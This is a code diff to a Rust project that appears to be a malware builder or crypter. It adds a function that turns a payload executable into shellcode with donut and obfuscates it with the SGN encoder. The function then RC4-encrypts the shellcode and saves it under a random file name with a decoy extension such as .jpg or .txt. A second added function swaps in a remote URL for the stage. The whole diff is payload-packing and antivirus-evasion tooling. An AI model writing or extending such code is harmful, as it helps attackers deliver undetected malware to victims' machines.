@@ -5,6 +5,49 @@ use rand::{rngs::OsRng, Rng, RngCore};
 
 use crate::{binary_arch::BinaryArch, crypto, h, mf_runner::MfStubCS, random, MfBuilder};
 
+pub fn build_native_stage_with_url(build_config: &mut MfBuilder, st: &mut MfStubCS, url: Option<String>) -> String {
+    if let Some(url) = url {
+        return url;
+    }
+    build_native_stage(build_config, st)
+}
+
+pub fn generate_encrypted_shellcode(build_config: &mut MfBuilder, st: &mut MfStubCS) -> Result<String, Box<dyn std::error::Error>> {
+    use std::fs;
+    use std::process::Command;
+    use rand::{rngs::OsRng, Rng, RngCore};
+    use crate::random;
+    
+    // Generate shellcode with donut
+    if build_config.build_arch == crate::binary_arch::BinaryArch::X64 {
+        Command::new("cmd.exe").args(["/c", "donut.exe", "-a", "2", "-b", "1", "--input:payload.exe", "--output:donut.bin"]).spawn()?.wait()?;
+    } else {
+        Command::new("cmd.exe").args(["/c", "donut.exe", "-a", "1", "-b", "1", "--input:payload.exe", "--output:donut.bin"]).spawn()?.wait()?;
+    }
+    
+    if build_config.build_arch == crate::binary_arch::BinaryArch::X64 {
+        Command::new("cmd.exe").args(["/c", "sgn.exe", "--input=donut.bin", "--out=sgn.bin"]).spawn()?.wait()?;
+        build_config.payload_bytes = fs::read("sgn.bin")?;
+        fs::remove_file("donut.bin")?;
+        fs::remove_file("sgn.bin")?;
+    } else {
+        build_config.payload_bytes = fs::read("donut.bin")?;
+        fs::remove_file("donut.bin")?;
+    }
+    
+    crypto::cipher_rc4::RC4::new(&st.payload_key).cipher(&mut build_config.payload_bytes);
+    
+    let file_extension = [
+        ".zip", ".rar", ".jpg", ".jpeg", ".txt", ".png", ".gif" 
+    ][OsRng.next_u32() as usize % 7].to_string();
+    let encrypted_shellcode_file_name = random::generate(OsRng.gen_range(10..=20)) + &file_extension;
+    let encrypted_shellcode_path = st.working_directory.clone() + "\\" + &encrypted_shellcode_file_name;
+    
+    fs::write(&encrypted_shellcode_path, &build_config.payload_bytes)?;
+    
+    Ok(encrypted_shellcode_path)
+}
+
 pub fn build_native_stage(build_config: &mut MfBuilder, st: &mut MfStubCS) -> String {
     println!("{}{}", h(), "Generating shellcode...".color(Color::Yellow));
     println!("{}{}", h(), "Stage 1".color(Color::Yellow));
